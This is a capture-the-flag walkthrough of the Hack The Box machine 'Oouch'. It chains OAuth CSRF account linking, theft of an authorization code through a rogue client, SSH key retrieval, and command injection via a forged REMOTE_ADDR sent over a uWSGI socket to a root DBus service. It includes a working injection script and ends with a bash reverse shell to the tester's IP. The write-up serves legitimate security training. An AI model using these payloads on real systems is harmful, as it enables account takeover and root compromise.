@@ -1,0 +1,508 @@
+Oouch
+
+27th July 2020 / Document No D20.100.82
+Prepared By: MinatoTW
+Machine Author: qtc
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth
+authorization framework. Absence of a CSRF Token is leveraged to link an administrative account
+to our account, providing access to sensitive information. This information is used to register a
+new client application and steal the authorization code. This code is used to gain an access token,
+which provides unrestricted access to user resources. A misconfigured DBus server is then
+exploited through uWSGI in order to execute code in the context of root.
+
+Skills Required
+
+      Web Enumeration
+      CSRF Exploitation
+      Scripting
+
+Skills Learned
+
+      OAuth Exploitation
+      DBus
+      uWSGI Protocol
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.177 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.177
+
+Nmap reveals four open ports, FTP (21) with anonymous login enabled, SSH (22), Nginx (5000)
+and another HTTP server on port 8000.
+
+FTP
+
+Let's enumerate any files and folders present on the FTP server.
+Logging in as the anonymous user gives us access to a file named project.txt , which is
+downloaded. Here are the contents of the file:
+
+   # project.txt
+   Flask -> Consumer
+   Django -> Authorization Server
+The file doesn't contain much information, but it provides us with the two terms Consumer and
+Authorization Server . A quick Google reveals that these terms are associated with OAuth
+terminology.
+
+OAuth is an authorization protocol that allows third party applications to access user accounts
+from external HTTP services. It works by sharing user authorization tokens, which are used to act
+on behalf of the user who authorizes the application. This removes the requirement for providing
+explicit credentials and relying solely on the information provided by the authorization server.
+For example, the application above permits us to login using explicitly provided credentials (email
+and password), or by delegated authentication to Google, Microsoft or Apple.
+
+There are four roles defined by OAuth:
+
+      Resource owner: This is the end-user who owns the user account on the authorization
+      server.
+      Client: This is the third party application (Atlassian) that requests the resource owner grant
+      access to the account. This is also referred to as the "Consumer".
+      Resource server: This is the server that hosts the resources needed by the client
+      application.
+      Authorization server: This server grants access tokens to the client server after a
+      successful authorization request (Google, Microsoft).
+
+Usually, the resource and authorization server are present on the same server. However, they
+can be hosted separately as well.
+
+The OAuth 2.0 RFC highlights the flow of the protocol.
+The flow starts with the resource owner (user) granting the authorization request from the client.
+The client then relays this to the authorization server in order to obtain an access token for the
+resource. This token is passed to the resource server, which returns any requested resources,
+such as user information.
+The project.txt file informs us that the consumer (client) application is hosted on a Flask
+server, while the authorization server is Django.
+
+Flask
+
+Browsing to port 5000 reveals an application with functionality to login and register an account.
+
+Let's create an account. After logging in, we can access our profile with the following information.
+Additionally, there's a Documents page which is accessible only to administrators.
+
+The About page informs us that this application is a small-scale implementation to support the
+Oouch authorization mechanism, that will be used across several applications in the future. It
+also states that we can contact the administrator in order to report bugs.
+
+The Contact page allows messages to be sent to the system administrator.
+Let's check if the form is vulnerable to XSS by submitting the following payload.
+   <img src="http://10.10.14.2/a" />
+
+Start a listener on port 80 and send the payload.
+
+However, the application seems to have detected the malicious XSS payload and blocked us for a
+minute. Let's keep this page in mind and continue enumeration.
+We already know that the flask server hosts a consumer application. Let's check if the oauth
+endpoint exists.
+The page does exist and provides us with access to functionality that is still under development.
+Users are expected to connect their account using /oauth/connect and then login via
+/oauth/login . The hostname is found to be consumer.oouch.htb . Let's add the following
+entries to /etc/hosts .
+
+   10.10.10.177 oouch.htb consumer.oouch.htb
+Browse to http://consumer.oouch.htb:5000 and sign in with the existing credentials. Clicking
+on the /oauth/connect link redirects to authorization.oouch.htb .
+
+Let's add this to the /etc/hosts file as well.
+   10.10.10.177 oouch.htb consumer.oouch.htb authorization.oouch.htb
+
+Django
+
+Browsing to this host reveals the Oouch authorization server.
+The server allows us to register a new Oouch account and use it for OAuth based logins. Clicking
+on the register link reveals a registration form, which has optional fields asking for SSH
+credentials. This indicates that the resource server is storing this. Let's keep this in mind and
+register a new account named test_oauth .
+
+After logging in, we come across two new endpoints for authorization and token retrieval
+respectively. Let's return to the /oauth endpoint on consumer and click on the /oauth/connect
+link.
+
+This time the authorization server prompts us to authorize the application. Clicking on
+Authorize should return us to the profile page, where we can see the connected account.
+
+We can now browse to the /oauth/login endpoint and login without providing explicit
+credentials.
+Let's use Burp to track the OAuth flow. Register a new account named test2 and then click on
+the /oauth/connect link. First, a request is send to the API endpoint with the current session.
+After forwarding the request, a new request is sent to
+http://authorization.oouch.htb:8000/oauth/authorize .
+
+This request contains the already signed in session of the account registered on the authorization
+server. Forwarding this request should bring us to the authorization prompt. Clicking on
+Authorize and inspecting the response, it's seen that the server returns the authorization token
+and redirects us.
+
+Following the redirection successfully connects us and redirects us to our profile. This
+authorization flow can be visualized in the following diagram.
+Now that we have an idea about the authorization process, let's try to exploit it. Looking back at
+the connection request with the token, we see that there's no CSRF token in the request.
+
+The request only contains the session cookie for the logged in user i.e. test2 . The absence of
+CSRF tokens means any valid access token can be used to connect to any user on the consumer
+application.
+It's possible that the system administrator clicks on URLs submitted via the /contact page. Let's
+generate a new access token and use it to connect the administrative account to ours.
+Foothold
+
+Exploiting CSRF
+
+Let's go back to the /oauth/connect endpoint and authorize ourselves again. Forward the
+authorization request and intercept the request to the /oauth/connect/token endpoint.
+
+This time, instead of forwarding the request, right-click > copy URL, and then drop the request to
+avoid registering the token. We now have a valid authorization token.
+
+   http://consumer.oouch.htb:5000/oauth/connect/token?
+   code=lgRmdFLnnWgz3nJ7CCOrpU7SOynm5B
+Browse to the /contact page and submit this URL.
+
+This should submit our access token from an administrator session, connecting our test_oauth
+account. Logging in through the /oauth/login endpoint after a couple of minutes should log us
+in as the qtc user.
+Looking at the documents page reveals some information.
+
+The documents provide us with developer credentials that allow application registration, an
+additional endpoint, and a note about an SSH key being leaked. Previous enumeration yielded
+that the resource server allowed storage of SSH credentials. o_auth_notes.txt states that the
+/oauth/authorize endpoint now supports GET requests, which makes it easier to exploit
+through CSRF. Let's save this information and continue enumeration.
+
+Registering a Client Application
+
+We already know that the authorization server is Django. According to the Django OAuth toolkit
+documentation, registered applications can be managed from the /oauth/applications
+endpoint. Browsing to this page prompts us for authentication.
+
+We enter the gained credentials but are denied access. Next, we could try to fuzz the endpoint
+and find more such pages using gobuster, but it returns 401 for every page.
+After manually attempting various educated guesses bases on the notes, it seems that the
+/applications/register endpoint is available for application registration. The credentials
+develop / supermegasecureklarabubu123! allow us to access the page.
+
+The page allows us to register our own consumer application. Let's register a new public client
+and enter the IP address of our listener under Redirect Uris .
+
+The Authorization Grant Type is set to authorization-code so that we can obtain the token.
+Let's return to Burp and examine the client authorization request.
+We see a POST request with the parameters csrfmiddlewaretoken , client_id and allow . The
+Documents page informed us that the page supports GET requests, so we can right-click >
+change request method to change it a GET request. Hit CTRL + R to forward the request to
+Repeater and click Send .
+
+The request was successful and the server redirects us with an authorization code. This makes
+the URL ideal to exploit via CSRF. However, we see a csrfmiddlewaretoken parameter in the
+request. This can prevent us from making a successful request due to token expiry. It's possible
+that the application might accept requests without the token due to flawed logic. Let's remove
+the parameter and resend the request.
+
+The request succeeded even without the token. Let's try to authorize our htbapp application.
+Change the client ID to the one given by the server and the redirect_uri to
+http://10.10.14.2/auth .
+
+The request succeeded and we are being redirect to our listener. Let's copy this URL and submit it
+through the contact page.
+
+   http://authorization.oouch.htb:8000/oauth/authorize/?
+   client_id=0xH2EfvRNGCu1nSqYI6GbBwSBbttgPjI9PjQnZL3&response_type=code&scope=read
+   &redirect_uri=http://10.10.14.2/auth&state=&response_type=code&allow=Authorize
+We should receive a request with the administrator's authorization code a couple minutes later.
+Generating an Access Token
+
+Now that we have a valid authorization code, we can use it to generate an access token. This is
+done by the authorization server internally. However we already know about the /oauth/token
+endpoint.
+The Django OAuth documentation shows how a token can be requested using cURL.
+
+   curl -X POST -d "grant_type=<grant_type>&client_id=
+   <your_client_id>&client_secret=<your_client_secret>&code=<code>"
+   http://localhost:8000/o/token/
+
+The client_id , client_secret and grant_type are already know to us via the application
+registration, while the code parameter is the token we received.
+Let's try submitting the following request to the /oauth/token endpoint.
+
+   curl -X POST -d
+   "grant_type=authorization_code&client_id=0xH2EfvRNGCu1nSqYI6GbBwSBbttgPjI9PjQnZL
+   3&client_secret=E1Tn47WTQ7Leei0GDy8ZbVCnrmZ0XDnr0dmljLyakrq8MboibMUqDcgFsUva457G
+   bWUJqPFUErRNpmleX4nbMJsui4uZCEVI4fMHrkhyvi0rKSvgWZ9tB4825VFaeP1e&code=VpYQsI7TvL
+   Pt1KdSQoA8PLRfMo2rau" http://authorization.oouch.htb:8000/oauth/token/
+
+   {"access_token": "cnu69AJrAMdhIHniwFIQSNwD9acOMC", "expires_in": 600,
+   "token_type": "Bearer", "scope": "read", "refresh_token":
+   "fc3pieJuyY9FLgc4xt6LIruE2bzIjZ"}
+
+The request was successful and we obtained an access token.
+Note: Ensure that the client code is fresh and unused.
+The Django documentation states that the API can be accessed by supplying the token through
+an Authorization header.
+
+   curl -H 'Authorization: Bearer cnu69AJrAMdhIHniwFIQSNwD9acOMC'
+   http://authorization.oouch.htb:8000/api/get_user
+The request above accessed the /api/get_user endpoint found earlier.
+The response is found to contain the admin user details. It's possible to make an educated guess
+that SSH data can be retrieved using the /api/get_ssh or a similar endpoint. Let's try requesting
+this.
+
+The request succeeded and we gain access to the SSH key. We can now use this to login as the
+qtc user.
+Privilege Escalation
+
+Looking at the running processes we see that Flask and Django applications are running in
+Docker containers.
+
+The IP address of the authorization server (Django) is 172.18.0.2 while the IP of the consumer
+(Flask) is 172.18.0.4 . Looking at qtc's home folder we find a hidden note.
+
+The note talks about an IPS (Intrusion Prevention System) implemented using DBus and iptables.
+Iptables is a utility to configure firewall rules, to deny and allow access to certain hosts and ports.
+DBus on the other hand, is a message bus system used for inter-application communication.
+Looking at the running processes, we see the dbus-server running as root.
+DBus
+
+Looking at the DBus documentation, it's found that configuration files are stored in the
+/etc/dbus-1 folder. Let's take a look at this folder.
+
+The file htb.oouch.Block.conf seems to be of interest.
+   <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
+   <!DOCTYPE busconfig PUBLIC
+     "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
+     "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+   <busconfig>
+          <policy user="root">
+                 <allow own="htb.oouch.Block"/>
+          </policy>
+                 <policy user="www-data">
+                                <allow send_destination="htb.oouch.Block"/>
+                                <allow receive_sender="htb.oouch.Block"/>
+                 </policy>
+   </busconfig>
+
+The configuration states that the www-data user is allowed to interact with the htb.oouch.Block
+interface. We note that the owner of the interface is root .
+A list of available DBus services can be obtained with the following one-liner.
+   python3 -c "import dbus; print(*dbus.SystemBus().list_names(), sep='\n')"
+
+We see the htb.oouch.Block service among the others. It could be possible to exploit
+misconfigurations in the interface to get to root. In order to do that, we'll need access to the www-
+data user. Let's keep this aside and continue enumeration.
+The .ssh folder is found to contain a private key not matching the one we already have.
+
+Let's check if this key can be reused to login to the dockers. We can check for SSH availability
+using the following bash command.
+
+   (echo > /dev/tcp/172.18.0.2/22) 2>/dev/null; echo $?
+A status code of 1 means that the port is closed, while 0 is returned on a successful connect.
+We see that the 172.18.0.4 host has SSH available. Let's try to login to this container.
+
+The login is successful and we gain SSH access to the container. The /code folder is found to
+contain the configuration and service related files.
+
+The application seems to be running on Nginx through a uWSGI socket. WSGI or Web Service
+Gateway Interface, provides an interface for web servers such as Nginx and Apache to access
+Python based applications. It's configuration can be observed in the uwsgi.ini file.
+
+  [uwsgi]
+
+   module = oouch:app
+   uid = www-data
+   gid = www-data
+   master = true
+   processes = 10
+   socket = /tmp/uwsgi.socket
+   chmod-sock = 777
+   vacuum = true
+   die-on-term = true
+The socket file present at /tmp/uwsgi.socket is running as www-data with 777 permissions,
+meaning that any user can interact with it.
+The file oouch/routes.py contains the application routing code.
+   @app.route('/contact', methods=['GET', 'POST'])
+   @login_required
+def contact():
+       # First we need to load the contact form
+       form = ContactForm()
+
+       # If the form was already submitted, we process the contents
+       if form.validate_on_submit():
+
+            # First apply our primitive xss filter
+              if primitive_xss.search(form.textfield.data):
+                     bus = dbus.SystemBus()
+                     block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+                     block_iface = dbus.Interface(block_object,
+
+dbus_interface='htb.oouch.Block')
+
+        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
+        response = block_iface.Block(client_ip)
+        bus.close()
+        return render_template('hacker.html', title='Hacker')
+
+<SNIP>
+
+The contact endpoint seems to be of interest. It detects XSS payloads in the request and uses
+dbus to send the client's IP address to the DBus server on the host. It's possible that this address
+is picked up and blocked using iptables. Let's verify what's happening behind the scenes using
+pspy.
+
+Go back to the SSH shell on the host and transfer the binary.
+
+wget http://10.10.14.2/pspy64s
+chmod +x pspy64s
+./pspy64s
+
+Let's navigate to the /contact page and submit an XSS payload.
+
+As expected, we see iptables being invoked with our IP address. We can surmise that the server is
+passing the IP address directly to a system() or exec() function?
+
+If the user provided data isn't sanitized, this might let us inject system commands and execute
+them in context of root. For example, the IP address 10.10.14.2 ; touch /tmp/pwned; # will
+result in the command:
+
+   iptables -A PREROUTING -s 10.10.14.2 ; touch /tmp/pwned; # -t mangle -j DROP
+This will execute the command touch /tmp/pwned while commenting out the following text.
+Checking back on the routes.py code, we see the following:
+
+   client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
+   response = block_iface.Block(client_ip)
+
+We see that client_ip is taken from the REMOTE_ADDR environment variable. The Nginx
+documentation states that this variable contains the client IP address. It's not possible to modify
+the client IP address under normal conditions. However, we have direct access to the uWSGI
+socket as seen before. The socket is running as the www-data user, which has the ability to
+interact with the DBus interface.
+
+uWSGI
+
+Unlike HTTP, uWSGI uses a binary protocol for communication. This means we can't
+communicate with it using plain HTTP requests. We can use the uwsgi-tools project as a reference
+to create a script which can communicate with the socket.
+Firstly, we'll need the packet structure present in uwsgi-structs.py file. This structure represents
+the packet header recognized by the uWSGI protocol as shown here. Next, we'll need
+pack_uwsgi_vars() from utils.py file. This method does nothing but put together the packet as
+a byte array.
+
+This method puts together the data in its required format. The project doesn't support
+communication over a Unix socket, which means that we'll have to implement this manually.
+
+   <SNIP>
+
+   def send_data(data):
+
+        data = pack_uwsgi_vars(data)
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.connect('/tmp/uwsgi.socket')
+
+        s.send(data)
+
+        resp = ''
+        while True:
+
+                recvd = s.recv(1024)
+                if recvd:
+
+                       resp += recvd.decode('utf-8')
+                else:
+
+                       break
+        s.close()
+        return resp
+
+   if __name__ == '__main__':
+
+          data = {
+                 'SERVER_PROTOCOL': 'HTTP/1.1',
+                 'PATH_INFO': '/',
+                 'REQUEST_METHOD': 'GET',
+                 'REQUEST_URI': '/',
+                 'HTTP_HOST': 'consumer.oouch.htb',
+                 'SERVER_HOST': 'consumer.oouch.htb',
+                 'SERVER_PORT' : '5000'
+          }
+          print(send_data(data))
+The entire script can be found in the appendix section. The code above opens a socket and then
+sends the HTTP request in binary form. The HTTP variables were taken from the curl.py file. The
+script sends a GET request to http://consumer.oouch.htb:5000/ and then prints the response.
+Download the script using Wget and then transfer it to the Docker using scp.
+   wget 10.10.14.2/uwsgi_comm.py
+   scp uwsgi_comm.py qtc@172.18.0.4:/tmp/
+Then proceed to run the script on the docker.
+
+The script seems to work as we obtained a successful response. The server is redirecting us to
+the login page as we don't have a valid session. Let's go back to the browser with a logged in
+session and send a request to the /contact page.
+
+The request contains a cookie named session , along with the POST body. The body contains
+three parameters named csrf_token , textfield and submit respectively. Let's copy these
+and add them to our script.
+   def send_data(data, body):
+
+        data = pack_uwsgi_vars(data) + body.encode('utf-8')
+
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.connect('/tmp/uwsgi.socket')
+
+        s.send(data)
+
+        resp = ''
+        while True:
+
+                recvd = s.recv(1024)
+                if recvd:
+
+                       resp += recvd.decode('utf-8')
+                else:
+
+                       break
+        s.close()
+        return resp
+
+   if __name__ == '__main__':
+
+          body =
+   'csrf_token=Ijk4ZWE2YTAzY2JkOTQ0MTJjNmQ5MGVmOTU4YmI3ZDI5YTZkNGNjM2Mi.Xx7G7Q.5izV
+   lt-cWW0OJfk1Wx7zy2zzoIU&textfield=<img+src%3dhttp%3a//10.10.14.2+/>&submit=Send'
+
+          data = {
+                 'SERVER_PROTOCOL': 'HTTP/1.1',
+                 'PATH_INFO': '/contact',
+                 'REQUEST_METHOD': 'POST',
+                 'HTTP_COOKIE': 'session=.eJyNjzFuwzAMRa-
+
+   iaA4KSZQUy6co2qFDEQQUSSVGnbiw5CnI3Su0Yzt0Igj-
+   B75_16cyY71I1eP7XavWh75KrXgWvdfPs2AVNS9nNd1UWxQS9aNql6mqz5550sfH_jf3IuepthXbtNzU
+   6_YNlW3eqTeZabmKalKb2_0N_-
+   vpcd_NV6kXPbZ1k75NrEftg2R2lo1HZJMtZjRFIrmAYlwiGzK6MsAhQeLgM7jMYDOVEEFoKIIHm6IPxq
+   LxjgL3oOPiwREgIaTMJkZfSEIWA4FFwEUDxchAzoSuT3Utp7Z8yK37pEEwogHKnLy3jiInIyWFIecDu4
+   SRPRFQ57Yq608Jqx9fgv1_Aw.Xx6Kfg.wXIDfdnBXArj7_vHx7wcSj35ziI',
+
+                 'DOCUMENT_BODY': body,
+                 'CONTENT_LENGTH': str(len(body)),
+                 'REQUEST_URI': '/contact',
+                 'HTTP_HOST': 'consumer.oouch.htb',
+                 'SERVER_HOST': 'consumer.oouch.htb',
+                 'SERVER_PORT' : '5000',
+                 'CONTENT_TYPE': 'application/x-www-form-urlencoded'
+          }
+
+          data['REMOTE_ADDR'] = f'; {sys.argv[1]}; #'
+
+          print(send_data(data, body))
+
+The script is modified to include the POST data as well as the cookies. The REMOTE_ADDR variable
+is set to ; <input command>; # , where the command is passed through the command line. The
+send_data() method appends the request body to the headers and sends it to the socket.
+Transfer the script to the container and run pspy on the host.
+Checking back on pspy, we see that our injected command ran and a file was created.
+
+Let's run a bash reverse shell to gain a shell as root.
+   python3 uwsgi_comm.py 'bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"'
+
+Running the command above triggers the command and a shell is received on port 4444.
+
